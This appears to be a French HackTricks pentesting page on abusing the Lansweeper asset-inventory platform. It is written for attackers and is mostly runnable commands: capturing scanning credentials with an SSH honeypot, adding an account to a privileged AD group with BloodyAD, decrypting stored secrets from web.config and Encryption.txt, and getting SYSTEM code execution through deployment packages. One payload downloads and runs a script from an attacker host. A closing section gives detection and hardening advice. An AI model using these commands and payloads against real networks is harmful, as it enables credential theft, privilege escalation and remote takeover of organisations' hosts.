# Abus de Lansweeper: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper est une plateforme de découverte et d'inventaire d'actifs IT couramment déployée sur Windows et intégrée à Active Directory. Les credentials configurés dans Lansweeper sont utilisés par ses moteurs de scan pour s'authentifier sur des assets via des protocoles comme SSH, SMB/WMI et WinRM. Des mauvaises configurations permettent fréquemment :

- Interception de credentials en redirigeant une Scanning Target vers un hôte contrôlé par l'attaquant (honeypot)
- Abus des AD ACLs exposées par des groupes liés à Lansweeper pour obtenir un accès distant
- Déchiffrement sur l'hôte des secrets configurés par Lansweeper (connection strings et scanning credentials stockés)
- Exécution de code sur des endpoints gérés via la feature Deployment (souvent exécutée en tant que SYSTEM)

Cette page résume des workflows et commandes pratiques pour un attaquant afin d'abuser de ces comportements lors d'engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idée : créer une Scanning Target qui pointe vers votre hôte et mapper les Scanning Credentials existants dessus. Quand le scan s'exécute, Lansweeper tentera de s'authentifier avec ces credentials et votre honeypot les capturera.

Aperçu des étapes (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = votre VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Valider les creds capturés contre les services DC :
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Remarques
- Fonctionne de la même manière pour d'autres protocoles lorsque vous pouvez forcer le scanner à se connecter à votre listener (honeypots SMB/WinRM, etc.). SSH est souvent le plus simple.
- Beaucoup de scanners s'identifient avec des bannières client distinctes (par ex., RebexSSH) et tenteront des commandes bénignes (uname, whoami, etc.).

## 2) AD ACL abuse: obtenir un accès distant en s'ajoutant à un groupe app-admin

Utilisez BloodHound pour énumérer les droits effectifs depuis le compte compromis. Une découverte courante est un groupe spécifique au scanner ou à l'application (par ex., “Lansweeper Discovery”) possédant GenericAll sur un groupe privilégié (par ex., “Lansweeper Admins”). Si le groupe privilégié est également membre de “Remote Management Users”, WinRM devient disponible une fois que nous nous y ajoutons.

Exemples de collecte:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploiter GenericAll sur un groupe avec BloodyAD (Linux) :
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Ensuite, obtenez un interactive shell :
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Astuce : Les opérations Kerberos sont sensibles au temps. Si vous obtenez KRB_AP_ERR_SKEW, synchronisez l'heure avec le DC d'abord :
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Décrypter les secrets configurés par Lansweeper sur l'hôte

Sur le serveur Lansweeper, le site ASP.NET stocke généralement une chaîne de connexion DB chiffrée et une clé symétrique utilisée par l'application. Avec un accès local approprié, vous pouvez déchiffrer la chaîne de connexion DB puis extraire les identifiants de scan stockés.

Emplacements typiques :
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Clé de l'application: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Utilisez SharpLansweeperDecrypt pour automatiser le déchiffrement et l'extraction des identifiants stockés :
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
La sortie attendue inclut les détails de connexion DB et les identifiants de scan en clair, tels que des comptes Windows et Linux utilisés dans l'ensemble du parc. Ceux-ci ont souvent des droits locaux élevés sur les hôtes du domaine :
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Utiliser les Windows scanning creds récupérés pour un accès privilégié :
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Déploiement Lansweeper → SYSTEM RCE

En tant que membre du groupe “Lansweeper Admins”, l'interface web expose les sections Deployment et Configuration. Sous Deployment → Deployment packages, vous pouvez créer des packages qui exécutent des commandes arbitraires sur des assets ciblés. L'exécution est effectuée par le service Lansweeper avec des privilèges élevés, permettant l'exécution de code en tant que NT AUTHORITY\SYSTEM sur l'hôte sélectionné.

High-level steps:
- Créez un nouveau Deployment package qui exécute une commande PowerShell ou cmd d'une seule ligne (reverse shell, add-user, etc.).
- Ciblez l'asset souhaité (par ex., le DC/host où Lansweeper s'exécute) et cliquez sur Deploy/Run now.
- Récupérez votre shell en tant que SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Les actions de déploiement sont bruyantes et laissent des logs dans Lansweeper et les journaux d'événements Windows. À utiliser avec discernement.

## Détection et durcissement

- Restreindre ou supprimer les énumérations SMB anonymes. Surveiller le RID cycling et les accès anormaux aux partages Lansweeper.
- Contrôles de sortie : bloquer ou restreindre fortement les connexions sortantes SSH/SMB/WinRM depuis les hôtes du scanner. Alerter sur les ports non standard (p.ex., 2022) et les bannières client inhabituelles comme Rebex.
- Protéger `Website\\web.config` et `Key\\Encryption.txt`. Externalisez les secrets dans un vault et renouvelez-les s'ils sont exposés. Envisagez des comptes de service avec des privilèges minimaux et gMSA lorsque possible.
- Surveillance AD : alerter sur les changements des groupes liés à Lansweeper (p.ex., “Lansweeper Admins”, “Remote Management Users”) et sur les modifications d'ACL accordant GenericAll/Write membership sur des groupes privilégiés.
- Auditez la création/modification/exécution des packages de déploiement ; alerter sur les packages qui lancent cmd.exe/powershell.exe ou établissent des connexions sortantes inattendues.

## Sujets liés
- Énumération SMB/LSA/SAMR et RID cycling
- Kerberos password spraying et considérations sur le clock skew
- Analyse des chemins BloodHound des groupes application-admin
- Utilisation de WinRM et mouvement latéral

## Références
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
